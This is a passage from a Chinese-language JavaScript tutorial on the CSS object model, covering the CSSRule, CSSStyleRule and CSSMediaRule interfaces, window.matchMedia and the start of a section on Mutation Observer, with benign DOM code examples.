<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">var</span> style = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">style.<span class="title function_">setAttribute</span>(<span class="string">&#x27;media&#x27;</span>, <span class="string">&#x27;screen&#x27;</span>);</span><br><span class="line">style.<span class="property">innerHTML</span> = <span class="string">&#x27;body&#123;color:red&#125;&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">var</span> style = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> style = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(style);</span><br><span class="line">  <span class="keyword">return</span> style;</span><br><span class="line">&#125;)();</span><br><span class="line">style.<span class="property">sheet</span>.<span class="title function_">insertRule</span>(<span class="string">&#x27;.foo&#123;color:red;&#125;&#x27;</span>, <span class="number">0</span>); <span class="comment">// 样式表插入规则</span></span><br></pre></td></tr></table></figure>

<p>另一种是添加外部样式表，即在文档中添加一个<code>&lt;link&gt;</code>节点，然后将<code>href</code>属性指向外部样式表的 URL。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> linkElm = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;link&#x27;</span>);</span><br><span class="line">linkElm.<span class="title function_">setAttribute</span>(<span class="string">&#x27;rel&#x27;</span>, <span class="string">&#x27;stylesheet&#x27;</span>);</span><br><span class="line">linkElm.<span class="title function_">setAttribute</span>(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/css&#x27;</span>);</span><br><span class="line">linkElm.<span class="title function_">setAttribute</span>(<span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;reset-min.css&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(linkElm);</span><br></pre></td></tr></table></figure>



<h3 id="9、CSSRuleList-接口"><a href="#9、CSSRuleList-接口" class="headerlink" title="9、CSSRuleList 接口"></a>9、CSSRuleList 接口</h3><p>CSSRuleList 接口是<strong>一个类似数组的对象，表示一组 CSS 规则，成员都是 CSSRule 实例</strong>。</p>
<p>获取 CSSRuleList 实例，一般是通过<code>StyleSheet.cssRules</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;style id=&quot;myStyle&quot;&gt;</span></span><br><span class="line"><span class="comment">//   h1 &#123; color: red; &#125;</span></span><br><span class="line"><span class="comment">//   p &#123; color: blue; &#125;</span></span><br><span class="line"><span class="comment">// &lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> myStyleSheet = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myStyle&#x27;</span>).<span class="property">sheet</span>;</span><br><span class="line"><span class="keyword">var</span> crl = myStyleSheet.<span class="property">cssRules</span>;</span><br><span class="line">crl <span class="keyword">instanceof</span> <span class="title class_">CSSRuleList</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>CSSRuleList 实例里面，每一条规则（CSSRule 实例）可以通过<code>rules.item(index)</code>或者<code>rules[index]</code>拿到。CSS 规则的条数通过<code>rules.length</code>拿到。还是用上面的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crl[<span class="number">0</span>] <span class="keyword">instanceof</span> <span class="title class_">CSSRule</span> <span class="comment">// true</span></span><br><span class="line">crl.<span class="property">length</span> <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<p>注意，添加规则和删除规则不能在 CSSRuleList 实例操作，而要在它的父元素 StyleSheet 实例上，通过<code>StyleSheet.insertRule()</code>和<code>StyleSheet.deleteRule()</code>操作。</p>
<h3 id="10、CSSRule-接口"><a href="#10、CSSRule-接口" class="headerlink" title="10、CSSRule 接口"></a>10、CSSRule 接口</h3><h4 id="10-1-概述"><a href="#10-1-概述" class="headerlink" title="10.1 概述"></a>10.1 概述</h4><p>一条 CSS 规则包括两个部分：CSS 选择器和样式声明。下面就是一条典型的 CSS 规则。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.myClass</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">  <span class="attribute">background-color</span>: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JavaScript <strong>通过 CSSRule 接口操作 CSS 规则</strong>。一般通过 CSSRuleList 接口（<code>StyleSheet.cssRules</code>）获取 CSSRule 实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;style id=&quot;myStyle&quot;&gt;</span></span><br><span class="line"><span class="comment">//   .myClass &#123;</span></span><br><span class="line"><span class="comment">//     color: red;</span></span><br><span class="line"><span class="comment">//     background-color: yellow;</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line"><span class="comment">// &lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> myStyleSheet = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myStyle&#x27;</span>).<span class="property">sheet</span>;</span><br><span class="line"><span class="keyword">var</span> ruleList = myStyleSheet.<span class="property">cssRules</span>;</span><br><span class="line"><span class="keyword">var</span> rule = ruleList[<span class="number">0</span>];</span><br><span class="line">rule <span class="keyword">instanceof</span> <span class="title class_">CSSRule</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h4 id="10-2-CSSRule-实例的属性"><a href="#10-2-CSSRule-实例的属性" class="headerlink" title="10.2 CSSRule 实例的属性"></a>10.2 CSSRule 实例的属性</h4><h5 id="（1）CSSRule-cssText"><a href="#（1）CSSRule-cssText" class="headerlink" title="（1）CSSRule.cssText"></a>（1）CSSRule.cssText</h5><p><code>CSSRule.cssText</code>属性<strong>返回当前规则的文本</strong>，还是使用上面的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rule.<span class="property">cssText</span></span><br><span class="line"><span class="comment">// &quot;.myClass &#123; color: red; background-color: yellow; &#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>如果规则是加载（<code>@import</code>）其他样式表，<code>cssText</code>属性返回<code>@import &#39;url&#39;</code>。</p>
<h5 id="（2）CSSRule-parentStyleSheet"><a href="#（2）CSSRule-parentStyleSheet" class="headerlink" title="（2）CSSRule.parentStyleSheet"></a>（2）CSSRule.parentStyleSheet</h5><p><code>CSSRule.parentStyleSheet</code>属性<strong>返回当前规则所在的样式表对象（StyleSheet 实例）</strong>，还是使用上面的例子。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rule.<span class="property">parentStyleSheet</span> === myStyleSheet <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h5 id="（3）CSSRule-parentRule"><a href="#（3）CSSRule-parentRule" class="headerlink" title="（3）CSSRule.parentRule"></a>（3）CSSRule.parentRule</h5><p><code>CSSRule.parentRule</code>属性<strong>返回包含当前规则的父规则，如果不存在父规则（即当前规则是顶层规则），则返回<code>null</code>。</strong></p>
<p>父规则最常见的情况是，当前规则包含在<code>@media</code>规则代码块之中。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;style id=&quot;myStyle&quot;&gt;</span></span><br><span class="line"><span class="comment">//   @supports (display: flex) &#123;</span></span><br><span class="line"><span class="comment">//     @media screen and (min-width: 900px) &#123;</span></span><br><span class="line"><span class="comment">//       article &#123;</span></span><br><span class="line"><span class="comment">//         display: flex;</span></span><br><span class="line"><span class="comment">//       &#125;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">// &lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> myStyleSheet = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myStyle&#x27;</span>).<span class="property">sheet</span>;</span><br><span class="line"><span class="keyword">var</span> ruleList = myStyleSheet.<span class="property">cssRules</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rule0 = ruleList[<span class="number">0</span>];</span><br><span class="line">rule0.<span class="property">cssText</span></span><br><span class="line"><span class="comment">// &quot;@supports (display: flex) &#123;</span></span><br><span class="line"><span class="comment">//    @media screen and (min-width: 900px) &#123;</span></span><br><span class="line"><span class="comment">//      article &#123; display: flex; &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">// &#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于这条规则内嵌其他规则，</span></span><br><span class="line"><span class="comment">// 所以它有 cssRules 属性，且该属性是 CSSRuleList 实例</span></span><br><span class="line">rule0.<span class="property">cssRules</span> <span class="keyword">instanceof</span> <span class="title class_">CSSRuleList</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rule1 = rule0.<span class="property">cssRules</span>[<span class="number">0</span>];</span><br><span class="line">rule1.<span class="property">cssText</span></span><br><span class="line"><span class="comment">// &quot;@media screen and (min-width: 900px) &#123;</span></span><br><span class="line"><span class="comment">//   article &#123; display: flex; &#125;</span></span><br><span class="line"><span class="comment">// &#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rule2 = rule1.<span class="property">cssRules</span>[<span class="number">0</span>];</span><br><span class="line">rule2.<span class="property">cssText</span></span><br><span class="line"><span class="comment">// &quot;article &#123; display: flex; &#125;&quot;</span></span><br><span class="line"></span><br><span class="line">rule1.<span class="property">parentRule</span> === rule0 <span class="comment">// true</span></span><br><span class="line">rule2.<span class="property">parentRule</span> === rule1 <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h5 id="（4）CSSRule-type"><a href="#（4）CSSRule-type" class="headerlink" title="（4）CSSRule.type"></a>（4）CSSRule.type</h5><p><code>CSSRule.type</code>属性<strong>返回一个整数值，表示当前规则的类型</strong>。</p>
<p>最常见的类型有以下几种。</p>
<ul>
<li>1：普通样式规则（CSSStyleRule 实例）</li>
<li>3：<code>@import</code>规则</li>
<li>4：<code>@media</code>规则（CSSMediaRule 实例）</li>
<li>5：<code>@font-face</code>规则</li>
</ul>
<h4 id="10-3-CSSStyleRule-接口"><a href="#10-3-CSSStyleRule-接口" class="headerlink" title="10.3 CSSStyleRule 接口"></a>10.3 CSSStyleRule 接口</h4><p><strong>如果一条 CSS 规则是普通的样式规则（不含特殊的 CSS 命令），那么除了 CSSRule 接口，它还部署了 CSSStyleRule 接口。</strong></p>
<p>CSSStyleRule 接口有以下两个属性。</p>
<h5 id="（1）CSSStyleRule-selectorText"><a href="#（1）CSSStyleRule-selectorText" class="headerlink" title="（1）CSSStyleRule.selectorText"></a>（1）CSSStyleRule.selectorText</h5><p><code>CSSStyleRule.selectorText</code>属性<strong>返回当前规则的选择器</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stylesheet = <span class="variable language_">document</span>.<span class="property">styleSheets</span>[<span class="number">0</span>];</span><br><span class="line">stylesheet.<span class="property">cssRules</span>[<span class="number">0</span>].<span class="property">selectorText</span> <span class="comment">// &quot;.myClass&quot;</span></span><br></pre></td></tr></table></figure>

<p>注意，这个属性是<strong>可写的</strong>。</p>
<h5 id="（2）CSSStyleRule-style"><a href="#（2）CSSStyleRule-style" class="headerlink" title="（2）CSSStyleRule.style"></a>（2）CSSStyleRule.style</h5><p><code>CSSStyleRule.style</code>属性<strong>返回一个对象（CSSStyleDeclaration 实例），代表当前规则的样式声明，也就是选择器后面的大括号里面的部分。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;style id=&quot;myStyle&quot;&gt;</span></span><br><span class="line"><span class="comment">//   p &#123; color: red; &#125;</span></span><br><span class="line"><span class="comment">// &lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> styleSheet = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myStyle&#x27;</span>).<span class="property">sheet</span>;</span><br><span class="line">styleSheet.<span class="property">cssRules</span>[<span class="number">0</span>].<span class="property">style</span> <span class="keyword">instanceof</span> <span class="title class_">CSSStyleDeclaration</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>CSSStyleDeclaration 实例的<code>cssText</code>属性，可以返回所有样式声明，格式为字符串。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">styleSheet.<span class="property">cssRules</span>[<span class="number">0</span>].<span class="property">style</span>.<span class="property">cssText</span></span><br><span class="line"><span class="comment">// &quot;color: red;&quot;</span></span><br><span class="line">styleSheet.<span class="property">cssRules</span>[<span class="number">0</span>].<span class="property">selectorText</span></span><br><span class="line"><span class="comment">// &quot;p&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="10-4-CSSMediaRule-接口"><a href="#10-4-CSSMediaRule-接口" class="headerlink" title="10.4 CSSMediaRule 接口"></a>10.4 CSSMediaRule 接口</h4><p><strong>如果一条 CSS 规则是<code>@media</code>代码块，那么它除了 CSSRule 接口，还部署了 CSSMediaRule 接口。</strong></p>
<p>该接口主要提供<code>media</code>属性和<code>conditionText</code>属性。前者返回代表<code>@media</code>规则的一个对象（MediaList 实例），后者返回<code>@media</code>规则的生效条件。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;style id=&quot;myStyle&quot;&gt;</span></span><br><span class="line"><span class="comment">//   @media screen and (min-width: 900px) &#123;</span></span><br><span class="line"><span class="comment">//     article &#123; display: flex; &#125;</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line"><span class="comment">// &lt;/style&gt;</span></span><br><span class="line"><span class="keyword">var</span> styleSheet = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myStyle&#x27;</span>).<span class="property">sheet</span>;</span><br><span class="line">styleSheet.<span class="property">cssRules</span>[<span class="number">0</span>] <span class="keyword">instanceof</span> <span class="title class_">CSSMediaRule</span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">styleSheet.<span class="property">cssRules</span>[<span class="number">0</span>].<span class="property">media</span></span><br><span class="line"><span class="comment">//  &#123;</span></span><br><span class="line"><span class="comment">//    0: &quot;screen and (min-width: 900px)&quot;,</span></span><br><span class="line"><span class="comment">//    appendMedium: function,</span></span><br><span class="line"><span class="comment">//    deleteMedium: function,</span></span><br><span class="line"><span class="comment">//    item: function,</span></span><br><span class="line"><span class="comment">//    length: 1,</span></span><br><span class="line"><span class="comment">//    mediaText: &quot;screen and (min-width: 900px)&quot;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">styleSheet.<span class="property">cssRules</span>[<span class="number">0</span>].<span class="property">conditionText</span></span><br><span class="line"><span class="comment">// &quot;screen and (min-width: 900px)&quot;</span></span><br></pre></td></tr></table></figure>



<h3 id="11、window-matchMedia"><a href="#11、window-matchMedia" class="headerlink" title="11、window.matchMedia()"></a>11、window.matchMedia()</h3><h4 id="11-1-基本用法"><a href="#11-1-基本用法" class="headerlink" title="11.1 基本用法"></a>11.1 基本用法</h4><p><code>window.matchMedia</code>方法<strong>用来将 CSS 的<a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/DOM/Using_media_queries_from_code"><code>MediaQuery</code></a>条件语句，转换成一个 MediaQueryList 实例</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mdl = <span class="variable language_">window</span>.<span class="title function_">matchMedia</span>(<span class="string">&#x27;(min-width: 400px)&#x27;</span>);</span><br><span class="line">mdl <span class="keyword">instanceof</span> <span class="title class_">MediaQueryList</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，变量<code>mdl</code>就是 mediaQueryList 的实例。</p>
<p>注意，如果参数不是有效的<code>MediaQuery</code>条件语句，<code>window.matchMedia</code>不会报错，依然返回一个 MediaQueryList 实例。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">matchMedia</span>(<span class="string">&#x27;bad string&#x27;</span>) <span class="keyword">instanceof</span> <span class="title class_">MediaQueryList</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>



<h4 id="11-2-MediaQueryList-接口的实例属性"><a href="#11-2-MediaQueryList-接口的实例属性" class="headerlink" title="11.2 MediaQueryList 接口的实例属性"></a>11.2 MediaQueryList 接口的实例属性</h4><p>MediaQueryList 实例有三个属性。</p>
<h5 id="（1）MediaQueryList-media"><a href="#（1）MediaQueryList-media" class="headerlink" title="（1）MediaQueryList.media"></a>（1）MediaQueryList.media</h5><p><code>MediaQueryList.media</code>属性<strong>返回一个字符串，表示对应的 MediaQuery 条件语句</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mql = <span class="variable language_">window</span>.<span class="title function_">matchMedia</span>(<span class="string">&#x27;(min-width: 400px)&#x27;</span>);</span><br><span class="line">mql.<span class="property">media</span> <span class="comment">// &quot;(min-width: 400px)&quot;</span></span><br></pre></td></tr></table></figure>



<h5 id="（2）MediaQueryList-matches"><a href="#（2）MediaQueryList-matches" class="headerlink" title="（2）MediaQueryList.matches"></a>（2）MediaQueryList.matches</h5><p><code>MediaQueryList.matches</code>属性<strong>返回一个布尔值，表示当前页面是否符合指定的 MediaQuery 条件语句</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="title function_">matchMedia</span>(<span class="string">&#x27;(min-width: 400px)&#x27;</span>).<span class="property">matches</span>) &#123;</span><br><span class="line">  <span class="comment">/* 当前视口不小于 400 像素 */</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">/* 当前视口小于 400 像素 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面的例子根据<code>mediaQuery</code>是否匹配当前环境，加载相应的 CSS 样式表。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = <span class="variable language_">window</span>.<span class="title function_">matchMedia</span>(<span class="string">&quot;(max-width: 700px)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result.<span class="property">matches</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> linkElm = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;link&#x27;</span>);</span><br><span class="line">  linkElm.<span class="title function_">setAttribute</span>(<span class="string">&#x27;rel&#x27;</span>, <span class="string">&#x27;stylesheet&#x27;</span>);</span><br><span class="line">  linkElm.<span class="title function_">setAttribute</span>(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/css&#x27;</span>);</span><br><span class="line">  linkElm.<span class="title function_">setAttribute</span>(<span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;small.css&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(linkElm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="（3）MediaQueryList-onchange"><a href="#（3）MediaQueryList-onchange" class="headerlink" title="（3）MediaQueryList.onchange"></a>（3）MediaQueryList.onchange</h5><p><strong>如果 MediaQuery 条件语句的适配环境发生变化，会触发<code>change</code>事件</strong>。<code>MediaQueryList.onchange</code>属性用来指定<code>change</code>事件的监听函数。该函数的参数是<code>change</code>事件对象（MediaQueryListEvent 实例），该对象与 MediaQueryList 实例类似，也有<code>media</code>和<code>matches</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mql = <span class="variable language_">window</span>.<span class="title function_">matchMedia</span>(<span class="string">&#x27;(max-width: 600px)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mql.<span class="property">onchange</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">matches</span>) &#123;</span><br><span class="line">    <span class="comment">/* 视口不超过 600 像素 */</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 视口超过 600 像素 */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>change</code>事件发生后，存在两种可能。一种是显示宽度从700像素以上变为以下，另一种是从700像素以下变为以上，所以在监听函数内部要判断一下当前是哪一种情况。</p>
<h4 id="11-3-MediaQueryList-接口的实例方法"><a href="#11-3-MediaQueryList-接口的实例方法" class="headerlink" title="11.3 MediaQueryList 接口的实例方法"></a>11.3 MediaQueryList 接口的实例方法</h4><p>MediaQueryList 实例有两个方法<code>MediaQueryList.addListener()</code>和<code>MediaQueryList.removeListener()</code>，<strong>用来为<code>change</code>事件添加或撤销监听函数</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mql = <span class="variable language_">window</span>.<span class="title function_">matchMedia</span>(<span class="string">&#x27;(max-width: 600px)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定监听函数</span></span><br><span class="line">mql.<span class="title function_">addListener</span>(mqCallback);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 撤销监听函数</span></span><br><span class="line">mql.<span class="title function_">removeListener</span>(mqCallback);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mqCallback</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">matches</span>) &#123;</span><br><span class="line">    <span class="comment">/* 视口不超过 600 像素 */</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 视口超过 600 像素 */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，<code>MediaQueryList.removeListener()</code>方法不能撤销<code>MediaQueryList.onchange</code>属性指定的监听函数。</p>
<h3 id="12、本章小结"><a href="#12、本章小结" class="headerlink" title="12、本章小结"></a>12、本章小结</h3><p>本章当中的实例（接口）有：</p>
<p><strong>CSSStyleDeclaration接口</strong>（css样式声明）： 用来操作元素的样式 </p>
<p><strong>StyleSheet接口（样式表</strong>）： 代表网页的一张样式表，包括<code>&lt;link&gt;</code>元素加载的样式表和<code> &lt;style&gt; </code>元素内嵌的样式表。 </p>
<p><strong>CSSRuleList接口（css规则列表）</strong>： 一个类似数组的对象，表示一组 CSS 规则，成员都是 CSSRule 实例。 </p>
<p><strong>CSSRule接口（css规则）</strong>： JavaScript 通过 CSSRule 接口操作 CSS 规则。一般通过 CSSRuleList 接口（<code>StyleSheet.cssRules</code>）获取 CSSRule 实例。 </p>
<p><strong>CSSStyleRule接口</strong>： 如果一条 CSS 规则是普通的样式规则（不含特殊的 CSS 命令），那么除了 CSSRule 接口，它还部署了 CSSStyleRule 接口。 </p>
<p><strong>CSSMediaRule 接口</strong>： 如果一条 CSS 规则是<code>@media</code>代码块，那么它除了 CSSRule 接口，还部署了 CSSMediaRule 接口。 </p>
<h2 id="九、Mutation-Observer-API-监视DOM变动"><a href="#九、Mutation-Observer-API-监视DOM变动" class="headerlink" title="九、Mutation Observer API 监视DOM变动"></a>九、Mutation Observer API 监视DOM变动</h2><h3 id="1、概述-1"><a href="#1、概述-1" class="headerlink" title="1、概述"></a>1、概述</h3><p>Mutation Observer API <strong>用来监视 DOM 变动</strong>。DOM 的任何变动，比如节点的增减、属性的变动、文本内容的变动，这个 API 都可以得到通知。</p>
<p>概念上，它很接近事件，<strong>可以理解为 DOM 发生变动就会触发 Mutation Observer 事件。但是，它与事件有一个本质不同：事件是同步触发，也就是说，DOM 的变动立刻会触发相应的事件；Mutation Observer 则是异步触发，DOM 的变动并不会马上触发，而是要等到当前所有 DOM 操作都结束才触发。</strong></p>
<p>这样设计是为了应付 DOM 变动频繁的特点。举例来说，如果文档中连续插入1000个<code> &lt;p&gt; </code>元素，就会连续触发1000个插入事件，执行每个事件的回调函数，这很可能造成浏览器的卡顿；而 Mutation Observer 完全不同，只在1000个段落都插入结束后才会触发，而且只触发一次。</p>
<p>Mutation Observer 有以下特点。</p>
<ul>
<li><strong>它等待所有脚本任务完成后，才会运行（即异步触发方式）。</strong></li>
<li><strong>它把 DOM 变动记录封装成一个数组进行处理，而不是一条条个别处理 DOM 变动。</strong></li>
<li><strong>它既可以观察 DOM 的所有类型变动，也可以指定只观察某一类变动。</strong></li>
</ul>
